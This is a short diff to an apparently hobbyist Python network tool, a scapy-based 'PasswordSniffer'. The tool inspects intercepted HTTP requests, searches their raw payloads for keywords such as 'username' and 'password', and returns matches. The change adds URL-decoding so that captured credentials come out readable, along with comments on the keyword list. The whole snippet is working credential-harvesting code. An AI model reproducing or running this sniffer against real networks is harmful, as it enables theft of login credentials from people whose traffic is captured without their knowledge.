@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 import argparse
 import sys
+import urllib.parse
 
 import scapy.all as scapy
 from scapy.layers import http
@@ -13,13 +14,15 @@ class PasswordSniffer:
     def get_url(self, packet):
         return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
 
+    # Find keywords in the packet load, if keywords exist, consider it as login info
     def get_login_info(self, packet):
         if packet.haslayer(scapy.Raw):
             load = str(packet[scapy.Raw].load)
+            # Add email here if you want, but it will cause a lot of false positive
             keywords = ["username", "uname", "user", "name", "login", "password", "pass", "key"]
             for keyword in keywords:
                 if keyword in load:
-                    return load
+                    return urllib.parse.unquote(load)
 
     def process_sniffed_packet(self, packet):
         if packet.haslayer(http.HTTPRequest):
